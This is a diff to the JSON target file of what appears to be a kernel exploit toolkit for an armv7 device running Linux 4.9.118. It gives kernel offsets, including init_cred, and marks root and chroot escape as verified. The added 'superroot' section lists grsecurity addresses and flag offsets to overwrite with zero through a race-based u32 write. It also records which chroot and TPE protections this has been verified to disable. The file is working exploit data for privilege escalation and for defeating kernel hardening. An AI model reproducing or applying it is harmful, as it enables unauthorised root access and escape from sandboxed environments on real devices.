@@ -10,7 +10,11 @@
       "kernel": "4.9.118",
       "arch": "armv7",
       "kimage": "no KASLR",
-      "verified": ["read", "root", "chroot-escape"],
+      "verified": [
+        "read",
+        "root",
+        "chroot-escape"
+      ],
       "offsets": {
         "_stext": "0x80100000",
         "init_cred": "0x8092f2bc",
@@ -30,6 +34,64 @@
         "page_offset": "0x80000000",
         "task_size": "0x7EA00000",
         "thread_size": "0x2000"
+      },
+      "superroot": {
+        "method": "ghostlock-u32-write",
+        "grsec_block": "0x8091e518",
+        "grsec_lock": "0x8091e574",
+        "apply": [
+          "chroot_caps",
+          "chroot_deny_mount",
+          "chroot_deny_sysctl",
+          "chroot_deny_chmod",
+          "chroot_deny_chroot",
+          "chroot_deny_mknod",
+          "chroot_deny_unix",
+          "chroot_deny_shmat",
+          "chroot_enforce_chdir",
+          "chroot_restrict_nice",
+          "chroot_deny_bad_rename",
+          "chroot_findtask"
+        ],
+        "flags": {
+          "chroot_findtask": "0x18",
+          "chroot_deny_unix": "0x1c",
+          "chroot_deny_mount": "0x20",
+          "chroot_deny_fchdir": "0x24",
+          "chroot_deny_shmat": "0x28",
+          "chroot_deny_chroot": "0x2c",
+          "chroot_deny_pivot": "0x30",
+          "chroot_enforce_chdir": "0x34",
+          "chroot_deny_chmod": "0x38",
+          "chroot_deny_mknod": "0x3c",
+          "chroot_restrict_nice": "0x40",
+          "chroot_caps": "0x44",
+          "chroot_deny_bad_rename": "0x48",
+          "chroot_deny_sysctl": "0x4c",
+          "tpe": "0x50",
+          "tpe_gid": "0x54",
+          "tpe_restrict_all": "0x58",
+          "grsec_lock": "0x5c",
+          "romount_protect": "0x94"
+        },
+        "left_enabled": [
+          "chroot_deny_fchdir",
+          "chroot_deny_pivot",
+          "tpe",
+          "tpe_restrict_all",
+          "grsec_lock"
+        ],
+        "verified": [
+          "mount",
+          "proc",
+          "dmesg",
+          "chmod",
+          "mknod",
+          "chroot",
+          "unix",
+          "shmat"
+        ],
+        "note": "escrever 0 (u32) em grsec_block+offset, uma variavel por corrida; ver docs/SUPERROOT.md"
       }
     }
   ]
